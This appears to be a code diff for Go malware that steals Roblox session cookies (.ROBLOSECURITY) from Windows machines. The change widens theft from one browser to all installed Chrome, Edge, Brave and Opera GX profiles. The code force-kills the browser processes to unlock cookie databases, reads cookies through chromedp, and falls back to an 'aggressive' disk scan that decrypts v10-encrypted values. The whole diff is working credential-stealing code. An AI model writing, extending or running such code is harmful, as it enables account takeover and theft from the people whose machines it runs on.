@@ -455,21 +455,32 @@ func contains(slice []string, s string) bool {
 	return false
 }
 
+type BrowserConfig struct {
+	Name        string
+	ExePaths    []string
+	ProfilePath string
+}
+
 func extractRobloxCookies() []string {
 	results := []string{}
 
 	// 1. Force kill browsers (Mandatory for Chromedp and Disk Scan to work)
-	// If browsers are open, they lock the profile and cookie database.
-	browsers := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "opera_gx.exe"}
-	for _, b := range browsers {
+	browsersToKill := []string{"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "opera_gx.exe"}
+	for _, b := range browsersToKill {
 		exec.Command("taskkill", "/F", "/IM", b, "/T").Run()
 	}
-	time.Sleep(2 * time.Second) // Give some time for processes to fully close
+	time.Sleep(2 * time.Second)
 
-	// 2. Try Chromedp (Browser automation)
-	execPath, profilePath, _ := getBrowserSettings()
-	if profilePath != "" {
-		browserCookies, err := getBrowserCookiesChromedp(execPath, profilePath)
+	// 2. Try Chromedp on ALL found browsers
+	browserConfigs := getAllBrowserSettings()
+	for _, config := range browserConfigs {
+		// Find the actual executable path from the candidates
+		actualExe, ok := findExistingPath(config.ExePaths)
+		if !ok || !dirExists(config.ProfilePath) {
+			continue
+		}
+
+		browserCookies, err := getBrowserCookiesChromedp(actualExe, config.ProfilePath)
 		if err == nil {
 			for _, cookie := range browserCookies {
 				if strings.Contains(strings.ToUpper(cookie.Name), "ROBLOSECURITY") {
@@ -485,7 +496,7 @@ func extractRobloxCookies() []string {
 	appCookies := extractRobloxCookiesFromDat()
 	results = append(results, appCookies...)
 
-	// 4. Aggressive Disk Scan (Fallback)
+	// 4. Aggressive Disk Scan (Fallback) for all browser paths
 	home, _ := os.UserHomeDir()
 	browserPaths := map[string]string{
 		"Chrome":   filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
@@ -507,14 +518,12 @@ func extractRobloxCookies() []string {
 			if err != nil {
 				return nil
 			}
-			// Plaintext check
 			matches := reRbx.FindAllString(string(content), -1)
 			for _, m := range matches {
 				if len(m) > 100 && !contains(results, m) {
 					results = append(results, m)
 				}
 			}
-			// v10 brute-force check
 			if masterKey != nil {
 				v10Idx := 0
 				for {
@@ -583,56 +592,53 @@ func getBrowserCookiesChromedp(execPath, profilePath string) ([]*network.Cookie,
 	return cookies, nil
 }
 
-func getBrowserSettings() (string, string, string) {
+func getAllBrowserSettings() []BrowserConfig {
 	home, _ := os.UserHomeDir()
 
-	// Define browser configurations
-	browsers := []struct {
-		name        string
-		exePaths    []string
-		profilePath string
-	}{
+	configs := []BrowserConfig{
 		{
-			name: "Brave",
-			exePaths: []string{
+			Name: "Brave",
+			ExePaths: []string{
 				filepath.Join("C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application", "brave.exe"),
 				filepath.Join("C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application", "brave.exe"),
 			},
-			profilePath: filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
+			ProfilePath: filepath.Join(home, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
 		},
 		{
-			name: "Chrome",
-			exePaths: []string{
+			Name: "Chrome",
+			ExePaths: []string{
 				filepath.Join("C:\\Program Files\\Google\\Chrome\\Application", "chrome.exe"),
 				filepath.Join("C:\\Program Files (x86)\\Google\\Chrome\\Application", "chrome.exe"),
 			},
-			profilePath: filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
+			ProfilePath: filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
 		},
 		{
-			name: "Edge",
-			exePaths: []string{
+			Name: "Edge",
+			ExePaths: []string{
 				filepath.Join("C:\\Program Files (x86)\\Microsoft\\Edge\\Application", "msedge.exe"),
 				filepath.Join("C:\\Program Files\\Microsoft\\Edge\\Application", "msedge.exe"),
+				filepath.Join(os.Getenv("PROGRAMFILES(X86)"), "Microsoft", "Edge", "Application", "msedge.exe"),
+				filepath.Join(os.Getenv("PROGRAMFILES"), "Microsoft", "Edge", "Application", "msedge.exe"),
 			},
-			profilePath: filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
+			ProfilePath: filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data"),
 		},
 		{
-			name: "Opera GX",
-			exePaths: []string{
+			Name: "Opera GX",
+			ExePaths: []string{
 				filepath.Join(home, "AppData", "Local", "Programs", "Opera GX", "launcher.exe"),
 			},
-			profilePath: filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
+			ProfilePath: filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
 		},
 	}
 
-	// Try each browser until one is found
-	for _, b := range browsers {
-		if path, ok := findExistingPath(b.exePaths); ok && dirExists(b.profilePath) {
-			return path, b.profilePath, b.name
+	var found []BrowserConfig
+	for _, b := range configs {
+		if _, ok := findExistingPath(b.ExePaths); ok && dirExists(b.ProfilePath) {
+			found = append(found, b)
 		}
 	}
 
-	return "", "", ""
+	return found
 }
 
 func findExistingPath(paths []string) (string, bool) {
